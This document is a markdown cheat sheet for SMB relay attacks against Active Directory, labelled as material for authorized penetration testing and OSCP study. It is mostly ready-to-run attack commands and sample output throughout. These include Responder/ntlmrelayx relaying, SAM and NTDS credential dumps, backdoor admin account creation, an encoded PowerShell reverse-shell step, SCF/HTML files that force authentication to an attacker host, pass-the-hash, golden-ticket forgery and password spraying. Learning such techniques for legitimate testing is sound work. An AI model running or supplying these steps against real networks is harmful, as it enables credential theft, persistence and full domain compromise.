# SMB Relay Attack — Active Directory Environment
> **Scope**: Authorized penetration testing and OSCP exam preparation only.

---

## Table of Contents
1. [Core Concepts](#core-concepts)
2. [AD vs Standalone — How to Identify](#ad-vs-standalone--how-to-identify)
3. [NTLM Authentication — Why Relay Works](#ntlm-authentication--why-relay-works)
4. [LLMNR Poisoning vs SMB Relay — Full Difference](#llmnr-poisoning-vs-smb-relay--full-difference)
5. [SMB Relay Prerequisites](#smb-relay-prerequisites)
6. [Detecting SMB Signing & LLMNR Status](#detecting-smb-signing--llmnr-status)
7. [SMB Relay — Complete Attack Walkthrough](#smb-relay--complete-attack-walkthrough)
8. [ntlmrelayx — All Modes Explained](#ntlmrelayx--all-modes-explained)
9. [Hash Types & What To Do With Each](#hash-types--what-to-do-with-each)
10. [Domain Controller — What You Get](#domain-controller--what-you-get)
11. [Lateral Movement Chain](#lateral-movement-chain)
12. [Troubleshooting](#troubleshooting)
13. [Quick Cheat Sheet](#quick-cheat-sheet)
14. [OSCP Checklist](#oscp-checklist)

---

## Core Concepts

### What is SMB Relay?

SMB Relay is a **Man-in-the-Middle attack** where the attacker:
1. Intercepts an NTLM authentication attempt from a victim
2. **Forwards (relays) it in real-time** to a different target machine
3. The target machine accepts it and grants access — **without ever knowing the password**

The password is **never cracked** — the hash itself is weaponized directly.

### One-Line Difference from LLMNR Poisoning

```
LLMNR Poisoning = Capture hash → crack offline → use password later
SMB Relay       = Capture hash → relay instantly → get access NOW
```

### Why It Works

Windows NTLM authentication is **challenge-response based**:
```
Client → Server: "I want access"
Server → Client: "Here is a random challenge"
Client → Server: NTLM_Response = Hash(NT_hash + challenge)
Server: Verifies → Grants access
```

When the attacker sits in the middle:
```
Victim → [NTLM Response] → Attacker → [Same NTLM Response] → Target
                                       Target verifies → Access granted!
```

The target sees a valid authentication — it has no way to know it was relayed.

---

## AD vs Standalone — How to Identify

### Method 1: CrackMapExec (Fastest)

```bash
crackmapexec smb 192.168.1.0/24
```

**Standalone machine:**
```
SMB  192.168.1.10  WIN10-PC  (domain:WIN10-PC) (signing:False)
                              ↑ domain = machine name = STANDALONE
```

**Active Directory environment:**
```
SMB  192.168.1.10  WIN10-PC  (domain:TECHCORP) (signing:False)
SMB  192.168.1.50  DC01      (domain:TECHCORP) (signing:True)
                              ↑ domain = company name = AD ENVIRONMENT
```

### Method 2: Port Scan for Domain Controller

```bash
nmap -p 88,389,636,3268,53 192.168.1.0/24
```

| Port | Service | Meaning |
|------|---------|---------|
| **88** | Kerberos | This machine IS the DC |
| **389** | LDAP | AD LDAP service |
| **636** | LDAPS | Secure LDAP |
| **3268** | Global Catalog | AD Forest |
| **53** | DNS | DC DNS |

> Port 88 open on any host = **Domain Controller found = AD Environment confirmed**

### Method 3: nmap OS Discovery

```bash
nmap -p 445 --script smb-os-discovery 192.168.1.10
```

**AD output:**
```
| smb-os-discovery:
|   Domain name: techcorp.local     ← AD domain!
|   FQDN: WIN10-PC.techcorp.local
```

**Standalone output:**
```
| smb-os-discovery:
|   Domain name: WORKGROUP          ← No domain = standalone
```

### Method 4: enum4linux

```bash
enum4linux -o 192.168.1.10
```

```
Domain Name: TECHCORP                ← AD present
Domain Sid: S-1-5-21-XXXXXXXXX...   ← Valid domain SID = AD confirmed
```

### Quick Rule

```
domain name = machine name  →  STANDALONE
domain name = company name  →  ACTIVE DIRECTORY
Port 88 open anywhere       →  DOMAIN CONTROLLER FOUND
DC always has signing:True  →  Cannot relay to DC via SMB directly
```

---

## NTLM Authentication — Why Relay Works

### Full Authentication Flow

```
Step 1 — NEGOTIATE
    Client  →  Server: "I want to authenticate"

Step 2 — CHALLENGE
    Server  →  Client: "Here is an 8-byte random challenge: 0x1122334455667788"

Step 3 — RESPONSE
    Client computes: NTLMv2_Response = HMAC-MD5(NT_Hash, challenge + timestamp + ...)
    Client  →  Server: [Username + Domain + NTLMv2_Response]

Step 4 — VERIFICATION
    Server checks response → Valid → Access granted
```

### Why Relay is Possible

The server in Step 4 only checks whether the **response is mathematically valid**.
It does NOT check whether the response was computed **by the legitimate client** or
**forwarded by an attacker**.

This is the fundamental design weakness exploited by SMB Relay.

### NTLMv1 vs NTLMv2

| Version | Security | Relay | Crack |
|---------|----------|-------|-------|
| NTLMv1 | Weak | Yes | Fast (hashcat -m 5500) |
| NTLMv2 | Stronger | Yes (if signing off) | Slower (hashcat -m 5600) |

> In modern AD environments, NTLMv2 is used. Both can be relayed when SMB signing is disabled.

---

## LLMNR Poisoning vs SMB Relay — Full Difference

### LLMNR Poisoning — Step by Step

```
1. Victim types: \\FILESERVER01\share  (doesn't exist)
2. DNS lookup fails
3. Victim sends LLMNR broadcast (port 5355):
   "Anyone know where FILESERVER01 is?"
4. Responder answers: "I am FILESERVER01!"
5. Victim sends NTLM authentication to attacker
6. Responder SAVES the NTLMv2 hash to a file
7. Attacker runs hashcat to crack it offline
8. Password recovered → used normally
```

**Tool:** Only Responder
**Responder config:** SMB = On (default)
**Output:** NTLMv2 hash file → crack with hashcat -m 5600
**Limitation:** Strong passwords will NOT crack. No password = no access.

---

### SMB Relay — Step by Step

```
1. Victim types: \\FILESERVER01\share  (doesn't exist)
2. DNS lookup fails
3. Victim sends LLMNR broadcast:
   "Anyone know where FILESERVER01 is?"
4. Responder answers: "I am FILESERVER01!"
   (Same as LLMNR poisoning up to here)
5. Victim sends NTLM authentication to attacker
6. Responder does NOT save it — FORWARDS it to ntlmrelayx
7. ntlmrelayx sends the same authentication to TARGET machine
8. TARGET verifies it — sees valid NTLM response — grants access
9. ntlmrelayx now has authenticated session on TARGET
10. Action: SAM dump / interactive shell / command execution
```

**Tools:** Responder (SMB=Off) + ntlmrelayx
**Output:** SAM hashes / shell / command output — NO password needed
**Requirement:** Target must have SMB signing disabled

---

### Side-by-Side Comparison

| Feature | LLMNR Poisoning | SMB Relay |
|---------|----------------|-----------|
| Tools needed | Responder only | Responder + ntlmrelayx |
| Responder SMB setting | ON | **OFF** (mandatory) |
| What happens to hash | Saved to file | Forwarded to target |
| Password required | Yes (after cracking) | **Never** |
| Speed to access | Slow (crack time) | Instant |
| Works if password is strong | No | **Yes** |
| Requires signing:False | No | **Yes** |
| Result | NTLMv2 hash file | SAM dump / shell / RCE |
| OSCP priority | Fallback option | **Try this first** |

### When to Use Which

```
Check signing status first:

signing:False exists?
    YES → SMB Relay (faster, no crack needed)
    NO  → LLMNR Poisoning (capture hash, crack offline)

Both can run simultaneously:
    Responder captures hashes for cracking (LLMNR)
    ntlmrelayx relays them (SMB Relay)
    One tool handles both scenarios at once
```

---

## SMB Relay Prerequisites

All five conditions must be true for the attack to succeed:

```
Condition 1: Attacker is on the SAME network segment (Layer 2)
             LLMNR is link-local — does not cross routers

Condition 2: SMB Signing is DISABLED on the target machine
             signing:False → relay works
             signing:True  → relay fails (signature verification fails)

Condition 3: LLMNR or NBT-NS is enabled on the victim machine
             Windows default: ENABLED
             This is the trigger mechanism

Condition 4: Victim's credentials have access on the target
             John's hash relayed to Machine-B only works if
             John has an account on Machine-B

Condition 5: Target has port 445 open and accessible
```

> **AD environments are ideal** because the same domain credentials are valid across multiple machines. One captured hash can be relayed to many targets.

---

## Detecting SMB Signing & LLMNR Status

### Check SMB Signing

**Method 1: CrackMapExec**
```bash
crackmapexec smb 192.168.1.0/24
# Look for: (signing:False) or (signing:True)
```

**Method 2: nmap**
```bash
nmap -p 445 --script smb2-security-mode 192.168.1.10
```
```
Message signing enabled but not required  ← signing:False = RELAY OK
Message signing enabled and required      ← signing:True  = RELAY FAILS
```

**Method 3: Generate relay target list automatically**
```bash
crackmapexec smb 192.168.1.0/24 --gen-relay-list targets.txt
cat targets.txt
# Only signing:False machines are saved here
```

---

### Check LLMNR Status

**Method 1: Responder Analyze Mode (Passive — No Poisoning)**
```bash
responder -I eth0 -A
# -A = analyze only, does not poison anything
```
```
[*] [LLMNR] Query: FILESERVER01 from 192.168.1.10  ← LLMNR is active!
[*] [NBT-NS] Query: PRINTER from 192.168.1.10
```
If you see queries → LLMNR/NBT-NS is enabled → attack is viable.

**Method 2: tcpdump**
```bash
tcpdump -i eth0 port 5355    # LLMNR
tcpdump -i eth0 port 137     # NBT-NS
tcpdump -i eth0 'port 5355 or port 137 or port 5353'
```
Traffic appearing → LLMNR/NBT-NS active.

**Method 3: Windows Registry (if you have shell access)**
```powershell
# LLMNR
reg query "HKLM\Software\Policies\Microsoft\Windows NT\DNSClient" /v EnableMulticast
# 0x0 = Disabled, 0x1 = Enabled, Key not found = Enabled (default)

# NBT-NS
reg query "HKLM\SYSTEM\CurrentControlSet\Services\NetBT\Parameters" /v NodeType
```

**Port Reference:**
| Port | Protocol |
|------|----------|
| 5355 | LLMNR |
| 137 | NBT-NS |
| 5353 | mDNS |

---

## SMB Relay — Complete Attack Walkthrough

### Lab Environment

```
Attacker (Kali):   192.168.1.100
Victim (Win10-HR): 192.168.1.10   — will trigger LLMNR
Target (Win10-IT): 192.168.1.20   — signing:False, relay destination
Target (Win10-FIN):192.168.1.30   — signing:False, relay destination
DC (Server 2019):  192.168.1.50   — signing:True, cannot relay via SMB
Domain:            techcorp.local
```

---

### Phase 1: Reconnaissance

```bash
# Full SMB overview
crackmapexec smb 192.168.1.0/24
```

```
192.168.1.10  WIN10-HR   domain:TECHCORP  signing:False  SMBv1:False
192.168.1.20  WIN10-IT   domain:TECHCORP  signing:False  SMBv1:False
192.168.1.30  WIN10-FIN  domain:TECHCORP  signing:False  SMBv1:False
192.168.1.50  DC01       domain:TECHCORP  signing:True   SMBv1:False
```

```bash
# Generate relay list (auto-excludes signing:True)
crackmapexec smb 192.168.1.0/24 --gen-relay-list targets.txt

cat targets.txt
# 192.168.1.10
# 192.168.1.20
# 192.168.1.30
```

```bash
# Confirm LLMNR is active
responder -I eth0 -A
# Wait a minute — if queries appear, LLMNR is enabled
```

---

### Phase 2: Configure Responder

```bash
nano /etc/responder/Responder.conf
```

Change these two lines:
```
SMB = Off
HTTP = Off
```

Verify:
```bash
grep -E "^SMB|^HTTP" /etc/responder/Responder.conf
# SMB = Off
# HTTP = Off
```

**Why SMB and HTTP must be Off:**
- If Responder's SMB server is ON, it handles the authentication itself and saves the hash — the relay never happens
- ntlmrelayx needs to receive the forwarded authentication on port 445
- Responder acts only as the **LLMNR bait** — ntlmrelayx does the actual relay
- Two servers cannot listen on the same port simultaneously

---

### Phase 3: Start Responder (Terminal 1)

```bash
responder -I eth0 -rdwv
```

**Confirm output:**
```
[+] Servers:
    HTTP server    [OFF]   ← Correct
    SMB server     [OFF]   ← Correct
[+] Poisoners:
    LLMNR          [ON]    ← This is the bait
    NBT-NS         [ON]
    MDNS           [ON]
[+] Listening for events...
```

---

### Phase 4: Start ntlmrelayx (Terminal 2)

```bash
# Default mode — SAM dump on success
ntlmrelayx.py -tf targets.txt -smb2support

# Interactive shell mode
ntlmrelayx.py -tf targets.txt -smb2support -i

# Execute a command on relay success
ntlmrelayx.py -tf targets.txt -smb2support -c "whoami"

# Create a backdoor admin account
ntlmrelayx.py -tf targets.txt -smb2support \
  -c "net user backdoor P@ssword123 /add && net localgroup administrators backdoor /add"
```

---

### Phase 5: Trigger Authentication

**Natural trigger (wait for user activity):**
A victim user tries to access a non-existent network share:
```
\\FILESERVER01\documents    (doesn't exist on network)
DNS fails → LLMNR broadcast → Responder responds → Auth sent → Relayed
```

**Manual trigger — SCF file on writable share:**
```bash
# Create the SCF file
cat > /tmp/@trigger.scf << 'EOF'
[Shell]
Command=2
IconFile=\\192.168.1.100\share\icon.ico
[Taskbar]
Command=ToggleDesktop
EOF

# Upload to a writable share
smbclient //192.168.1.10/PublicShare -N
smb: \> put /tmp/@trigger.scf
```
When any user opens that folder in Windows Explorer → auto-triggers NTLM auth.

**Manual trigger — HTML file:**
```html
<html><img src="\\192.168.1.100\share\image.jpg"></html>
```
Opening in any browser → NTLM auth attempt.

---

### Phase 6: Relay Succeeds — Read the Output

**Responder terminal:**
```
[*] [LLMNR] Poisoned answer sent to 192.168.1.10 for name FILESERVER01
[SMB] NTLMv2-SSP Client   : 192.168.1.10
[SMB] NTLMv2-SSP Username : TECHCORP\john
[SMB] NTLMv2-SSP Hash     : john::TECHCORP:1122334455667788:AABB...
```
> The hash is also saved to `/usr/share/responder/logs/` — useful as fallback for cracking.

**ntlmrelayx terminal (SAM dump mode):**
```
[*] SMBD: Received connection from 192.168.1.10, attacking target smb://192.168.1.20
[*] Authenticating against smb://192.168.1.20 as TECHCORP/JOHN SUCCEED
[*] Service RemoteRegistry is in stopped state
[*] Starting service RemoteRegistry
[*] Dumping local SAM hashes (uid:rid:lmhash:nthash)
Administrator:500:aad3b435b51404eeaad3b435b51404ee:8846f7eaee8fb117ad06bdd830b7586c:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
john:1001:aad3b435b51404eeaad3b435b51404ee:2b576acbe6bcfda7294d6bd18041b8fe:::
```

**ntlmrelayx terminal (interactive mode `-i`):**
```
[*] Authenticating against smb://192.168.1.20 as TECHCORP/JOHN SUCCEED
[*] Started interactive SMB client shell via TCP on 127.0.0.1:11000
```

---

### Phase 7: Use Interactive Shell

```bash
# Connect to the shell (new terminal)
nc 127.0.0.1 11000
```

```bash
# Inside SMB shell:
shares              # List all shares
use C$              # Access C: drive
ls                  # List files
cd Users\Administrator\Desktop
get proof.txt       # Download file
put reverse.exe     # Upload file (if write access)
```

---

### Phase 8: Shell via PTH from Dumped Hashes

```bash
# Use the Administrator NT hash from SAM dump
psexec.py -hashes :8846f7eaee8fb117ad06bdd830b7586c administrator@192.168.1.20

# Output:
C:\Windows\system32> whoami
nt authority\system

C:\Windows\system32> hostname
WIN10-IT

# Collect proof
type C:\Users\Administrator\Desktop\proof.txt
```

---

## ntlmrelayx — All Modes Explained

```bash
# ── Basic SAM dump (default) ──────────────────────────────────
ntlmrelayx.py -tf targets.txt -smb2support

# ── Interactive SMB shell ─────────────────────────────────────
ntlmrelayx.py -tf targets.txt -smb2support -i
# Then: nc 127.0.0.1 11000

# ── Execute single command ────────────────────────────────────
ntlmrelayx.py -tf targets.txt -smb2support -c "net user"

# ── Add backdoor admin user ───────────────────────────────────
ntlmrelayx.py -tf targets.txt -smb2support \
  -c "net user hacker P@ss123 /add && net localgroup administrators hacker /add"

# ── Reverse shell via PowerShell ─────────────────────────────
# Generate base64 payload first:
# msfvenom / revshells.com → base64 encode
ntlmrelayx.py -tf targets.txt -smb2support -c "powershell -enc BASE64PAYLOAD"

# ── SOCKS proxy (persistent multi-session) ───────────────────
ntlmrelayx.py -tf targets.txt -smb2support -socks
# Then in ntlmrelayx console: type 'socks' to see sessions
# Use with: proxychains smbclient //TARGET/C$ -U DOMAIN/USER

# ── Single specific target ────────────────────────────────────
ntlmrelayx.py -t smb://192.168.1.20 -smb2support

# ── LDAP relay (for AD attacks when SMB signing is ON) ────────
ntlmrelayx.py -t ldap://192.168.1.50 -smb2support
ntlmrelayx.py -t ldaps://192.168.1.50 -smb2support
```

### Flag Reference

| Flag | Purpose |
|------|---------|
| `-tf targets.txt` | File with relay target IPs |
| `-t IP` | Single relay target |
| `-smb2support` | Enable SMBv2 (required for modern Windows) |
| `-i` | Interactive shell mode |
| `-c "cmd"` | Execute command on relay success |
| `-socks` | Create SOCKS proxy per session |
| `-6` | IPv6 support |

### SOCKS Mode Workflow

```bash
# Start with SOCKS
ntlmrelayx.py -tf targets.txt -smb2support -socks

# After relay success, in ntlmrelayx console:
socks
# Protocol  Target          Username      Port
# SMB       192.168.1.20    TECHCORP/JOHN 1080

# Use proxychains
proxychains smbclient //192.168.1.20/C$ -U TECHCORP/JOHN
proxychains secretsdump.py TECHCORP/JOHN@192.168.1.20
proxychains crackmapexec smb 192.168.1.20 -u JOHN -p ''
```

---

## Hash Types & What To Do With Each

### NTLMv2 Hash (Captured by Responder)

**Source:** Responder capture from LLMNR poisoning
**Location:** `/usr/share/responder/logs/SMB-NTLMv2-SSP-*.txt`

**Format:**
```
john::TECHCORP:1122334455667788:AAABBBCCC...:01010000...
```

**Options:**
```bash
# Option 1: Crack it
hashcat -m 5600 hash.txt /usr/share/wordlists/rockyou.txt
hashcat -m 5600 hash.txt rockyou.txt -r /usr/share/hashcat/rules/best64.rule
john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt

# View cracked results
hashcat -m 5600 hash.txt --show
john hash.txt --show

# Option 2: Relay it (if signing:False) — don't crack, relay directly
ntlmrelayx.py -tf targets.txt -smb2support
```

---

### NT Hash (From SAM/NTDS Dump)

**Source:** secretsdump, ntlmrelayx SAM dump, CrackMapExec --sam

**Format:**
```
Administrator:500:aad3b435b51404eeaad3b435b51404ee:8846f7eaee8fb117ad06bdd830b7586c:::
                  ↑ LM hash (always this value = blank = ignore)
                                                   ↑ NT Hash — this is what you use
```

**Options:**
```bash
# Option 1: Pass-the-Hash (no cracking needed)
psexec.py -hashes :8846f7eaee8fb117ad06bdd830b7586c administrator@TARGET
wmiexec.py -hashes :8846f7eaee8fb117ad06bdd830b7586c administrator@TARGET
smbexec.py -hashes :8846f7eaee8fb117ad06bdd830b7586c administrator@TARGET
crackmapexec smb RANGE -u administrator -H :8846f7eaee8fb117ad06bdd830b7586c
secretsdump.py -hashes :8846f7eaee8fb117ad06bdd830b7586c administrator@TARGET
smbclient //TARGET/C$ -U administrator --pw-nt-hash 8846f7eaee8fb117ad06bdd830b7586c

# Option 2: Crack NT hash
hashcat -m 1000 8846f7eaee8fb117ad06bdd830b7586c /usr/share/wordlists/rockyou.txt
john --format=NT --wordlist=rockyou.txt hashes.txt
```

---

### Hash Decision Flow

```
Hash obtained
    ↓
NTLMv2? (from Responder/network capture)
    ├── signing:False target exists?  → RELAY IT (fastest)
    └── No relay target?              → hashcat -m 5600 (crack)
            ↓
        Password found?
        ├── YES → use normally (psexec/wmiexec)
        └── NO  → try other attack vectors

NT Hash? (from SAM/NTDS/secretsdump)
    └── PTH directly (no crack needed)
        → crackmapexec spray across network
        → psexec/wmiexec for shell
        → secretsdump for more hashes
```

---

## Domain Controller — What You Get

### Access Methods to DC

```bash
# If domain admin credentials obtained
secretsdump.py administrator:Password123@DC_IP
psexec.py administrator:Password123@DC_IP

# PTH to DC
psexec.py -hashes :ADMIN_NTHASH administrator@DC_IP
secretsdump.py -hashes :ADMIN_NTHASH administrator@DC_IP
```

---

### 1. Full NTDS.dit Dump — Every Domain Hash

```bash
# All domain credentials
secretsdump.py administrator:Password123@DC_IP

# Domain accounts only
secretsdump.py administrator:Password123@DC_IP -just-dc

# NTDS.dit specifically
secretsdump.py administrator:Password123@DC_IP -just-dc-ntds
```

**Output:**
```
TECHCORP\Administrator:500:aad3...:8846f7eaee8fb117ad06bdd830b7586c:::
TECHCORP\krbtgt:502:aad3...:abcdef1234567890abcdef1234567890:::
TECHCORP\john:1103:aad3...:2b576acbe6bcfda7294d6bd18041b8fe:::
TECHCORP\alice:1104:aad3...:9f4c23ab1234567890abcdef12345678:::
TECHCORP\WIN10-PC$:1105:aad3...:machine_account_hash:::
... (every single domain account)
```

**What each hash means:**
| Account | Value |
|---------|-------|
| `Administrator` | PTH to every machine as domain admin |
| `krbtgt` | Golden Ticket attack — permanent access |
| All users | PTH / crack / lateral movement |
| Machine accounts (`$`) | Can be used for Kerberos attacks |

---

### 2. SYSVOL — Hidden Credentials

```bash
# Access SYSVOL share
smbclient //DC_IP/SYSVOL -U 'administrator%Password123'

# Hunt for GPP passwords (Group Policy Preferences)
crackmapexec smb DC_IP -u administrator -p Password123 -M gpp_password
crackmapexec smb DC_IP -u administrator -p Password123 -M gpp_autologin

# Files that contain credentials:
# Groups.xml, Services.xml, ScheduledTasks.xml, DataSources.xml
```

GPP passwords are AES-256 encrypted but the **key is publicly known**:
```bash
# Decrypt manually
gpp-decrypt ENCRYPTED_PASSWORD_STRING
```

---

### 3. Golden Ticket Attack (krbtgt hash)

**What it is:** Forge Kerberos TGTs using the krbtgt hash — grants access to everything forever, even after password resets (except krbtgt itself).

```bash
# Get domain SID first
crackmapexec smb DC_IP -u administrator -p Password123 --get-sid
# OR from secretsdump output

# Create golden ticket
ticketer.py -nthash KRBTGT_NTHASH \
            -domain-sid S-1-5-21-XXXXXXXXXX-XXXXXXXXXX-XXXXXXXXXX \
            -domain techcorp.local \
            administrator

# Use the ticket
export KRB5CCNAME=administrator.ccache
psexec.py -k -no-pass DC_IP
secretsdump.py -k -no-pass DC_IP
```

---

### 4. DCSync Attack

DCSync impersonates a Domain Controller to request password replication data — no code runs on the DC.

```bash
# Requires Domain Admin or equivalent
secretsdump.py -just-dc techcorp.local/administrator:Password123@DC_IP

# Specific user only
secretsdump.py -just-dc-user krbtgt techcorp.local/administrator:Password123@DC_IP
secretsdump.py -just-dc-user administrator techcorp.local/administrator:Password123@DC_IP
```

---

### DC Compromise Chain

```
Get shell on any domain machine
         ↓
secretsdump → get local admin hash
         ↓
PTH across network → find domain admin session
         ↓
Dump LSASS / cached creds → domain admin hash/password
         ↓
secretsdump on DC → full NTDS.dit
         ↓
krbtgt hash → Golden Ticket (permanent access)
Administrator hash → PTH to every machine
All user hashes → crack or PTH
         ↓
DOMAIN FULLY COMPROMISED
```

---

## Lateral Movement Chain

### Step 1: First Machine Compromised

```bash
# Got credentials or hash on first machine
secretsdump.py administrator:Password123@192.168.1.10

# Dumped hashes:
# Administrator:...:8846f7eaee8fb117ad06bdd830b7586c:::
# john:...:2b576acbe6bcfda7294d6bd18041b8fe:::
```

### Step 2: Spray Hashes Across Network

```bash
# Try admin hash on all machines
crackmapexec smb 192.168.1.0/24 -u administrator -H :8846f7eaee8fb117ad06bdd830b7586c

# Output:
# 192.168.1.20  [+] administrator  (Pwn3d!)
# 192.168.1.30  [+] administrator  (Pwn3d!)
# 192.168.1.50  [+] administrator  (Pwn3d!)  ← DC!
```

### Step 3: Move to Next Machines

```bash
# Shell on each Pwn3d machine
psexec.py -hashes :8846f7eaee8fb117ad06bdd830b7586c administrator@192.168.1.20
psexec.py -hashes :8846f7eaee8fb117ad06bdd830b7586c administrator@192.168.1.30

# Collect proof files
type C:\Users\Administrator\Desktop\proof.txt
type C:\Users\Administrator\Desktop\local.txt
```

### Step 4: DC Shell and Full Dump

```bash
# Shell on DC
psexec.py -hashes :8846f7eaee8fb117ad06bdd830b7586c administrator@192.168.1.50

# Full domain dump
secretsdump.py -hashes :8846f7eaee8fb117ad06bdd830b7586c administrator@192.168.1.50 -just-dc-ntds

# Collect DC proof
type C:\Users\Administrator\Desktop\proof.txt
```

---

## LDAP Relay — When SMB Relay Fails on DC

DC always has SMB signing:True. Use LDAP relay instead for AD impact.

```bash
# LDAP relay to DC
ntlmrelayx.py -t ldap://DC_IP -smb2support

# LDAPS (secure)
ntlmrelayx.py -t ldaps://DC_IP -smb2support

# Add a computer account (useful for further Kerberos attacks)
ntlmrelayx.py -t ldap://DC_IP -smb2support --add-computer FAKEPC$ 'FakePass123!'

# Dump LDAP data
ntlmrelayx.py -t ldap://DC_IP -smb2support --dump-lm
```

> LDAP relay requires the relayed user to have sufficient AD privileges.
> Domain Admin relay → most powerful outcome.

---

## Troubleshooting

| Problem | Cause | Fix |
|---------|-------|-----|
| No hashes captured | LLMNR disabled, no traffic | Use analyze mode to verify: `responder -I eth0 -A` |
| Relay fails — access denied | Victim has no admin rights on target | Wait for admin user to trigger, or try other targets |
| Relay fails — connection reset | SMB signing enabled on target | Remove that IP from targets.txt |
| Responder captures hash but no relay | Responder SMB=On (conflict) | Set SMB=Off in Responder.conf |
| psexec fails after relay | UAC restriction on local accounts | Use built-in Administrator, or try wmiexec |
| STATUS_LOGON_FAILURE | Hash expired or wrong target | Capture fresh hash, verify target access |
| ntlmrelayx port conflict | Another process on port 445 | Kill conflicting process: `ss -tlnp \| grep 445` |
| Interactive shell won't connect | Wrong port number | Check ntlmrelayx output for exact port |

---

## Quick Cheat Sheet

```bash
# ═══ RECON ═══
crackmapexec smb RANGE                              # Full overview
crackmapexec smb RANGE --gen-relay-list targets.txt # Relay target list
nmap -p 88,445 RANGE                                # DC detection
responder -I eth0 -A                                # LLMNR check (passive)
nmap -p 445 --script smb2-security-mode RANGE       # Signing check

# ═══ SETUP ═══
# Edit /etc/responder/Responder.conf → SMB=Off, HTTP=Off
grep -E "^SMB|^HTTP" /etc/responder/Responder.conf  # Verify config

# ═══ ATTACK ═══
responder -I eth0 -rdwv                             # Terminal 1: Bait
ntlmrelayx.py -tf targets.txt -smb2support          # Terminal 2: SAM dump
ntlmrelayx.py -tf targets.txt -smb2support -i       # Terminal 2: Interactive
ntlmrelayx.py -tf targets.txt -smb2support -c "cmd" # Terminal 2: Execute cmd
nc 127.0.0.1 11000                                  # Connect to interactive shell

# ═══ HASH CRACKING ═══
hashcat -m 5600 hash.txt rockyou.txt                # NTLMv2 (Responder)
hashcat -m 1000 hash.txt rockyou.txt                # NT hash (SAM dump)
hashcat -m 5600 hash.txt rockyou.txt --show         # Show cracked

# ═══ PASS-THE-HASH ═══
crackmapexec smb RANGE -u admin -H :NTHASH          # Spray network
psexec.py -hashes :NTHASH admin@TARGET              # SYSTEM shell
wmiexec.py -hashes :NTHASH admin@TARGET             # Clean shell
smbclient //TARGET/C$ -U admin --pw-nt-hash NTHASH  # File access

# ═══ POST-EXPLOITATION ═══
secretsdump.py admin:pass@TARGET                    # Full dump
secretsdump.py -hashes :NTHASH admin@TARGET         # PTH dump
secretsdump.py admin:pass@DC_IP -just-dc-ntds       # Full domain dump
crackmapexec smb TARGET -u admin -p pass --sam      # SAM via CME
crackmapexec smb TARGET -u admin -p pass --lsa      # LSA via CME
crackmapexec smb DC_IP -u admin -p pass -M gpp_password  # GPP creds

# ═══ LDAP RELAY (when SMB signing:True on DC) ═══
ntlmrelayx.py -t ldap://DC_IP -smb2support
ntlmrelayx.py -t ldaps://DC_IP -smb2support
```

---

## OSCP Checklist

### Pre-Attack Verification
```
[ ] crackmapexec smb RANGE — note signing status, domain, SMBv1
[ ] Identify AD environment vs standalone (domain name check)
[ ] Locate DC (port 88 scan or domain:True in CME output)
[ ] Check signing:False machines → build targets.txt
[ ] Verify LLMNR active (responder -A analyze mode)
[ ] Confirm Responder.conf has SMB=Off and HTTP=Off
```

### Attack Execution
```
[ ] Terminal 1: responder -I eth0 -rdwv
[ ] Terminal 2: ntlmrelayx.py -tf targets.txt -smb2support -i
[ ] Wait for / trigger victim authentication
[ ] Confirm relay success in ntlmrelayx output
[ ] Note: which user relayed, which target authenticated
```

### Post-Relay Actions
```
[ ] SAM hashes collected from relay
[ ] Interactive shell obtained (nc 127.0.0.1 PORT)
[ ] NT hash extracted → PTH spray across network
[ ] psexec/wmiexec shell on target machines
[ ] secretsdump on each compromised machine
[ ] Hash spray → find domain admin access
[ ] DC access → secretsdump -just-dc-ntds
[ ] krbtgt hash collected (Golden Ticket potential)
[ ] proof.txt and local.txt collected from all machines
```

### When Relay Fails — Fallback Options
```
[ ] Use captured NTLMv2 hash from Responder logs
[ ] hashcat -m 5600 hash.txt rockyou.txt
[ ] If cracked → validate with crackmapexec → psexec for shell
[ ] Try LDAP relay to DC (ntlmrelayx -t ldap://DC_IP)
[ ] Check for anonymous shares / GPP passwords in SYSVOL
[ ] Try password spraying with common passwords
```

---

## Attack Flow Summary

```
┌──────────────────────────────────────────────────────────────────┐
│                    SMB RELAY FULL CHAIN                          │
│                                                                  │
│  RECON                                                           │
│  crackmapexec → signing:False found → gen-relay-list            │
│  responder -A  → LLMNR confirmed active                          │
│         ↓                                                        │
│  SETUP                                                           │
│  Responder.conf SMB=Off, HTTP=Off                                │
│  responder -I eth0 -rdwv        (Terminal 1 — bait)             │
│  ntlmrelayx -tf targets -smb2   (Terminal 2 — relay)            │
│         ↓                                                        │
│  TRIGGER                                                         │
│  Victim accesses non-existent share → LLMNR broadcast           │
│  Responder answers → Victim sends NTLM auth                     │
│  ntlmrelayx forwards to target → Target grants access           │
│         ↓                                                        │
│  EXPLOIT                                                         │
│  SAM dump → NT hashes                                           │
│  PTH → shells on multiple machines                               │
│  secretsdump → more hashes                                       │
│         ↓                                                        │
│  DOMAIN TAKEOVER                                                 │
│  Domain Admin hash found → secretsdump DC → NTDS.dit            │
│  All domain hashes → PTH everywhere                             │
│  krbtgt hash → Golden Ticket → Permanent access                 │
└──────────────────────────────────────────────────────────────────┘
```
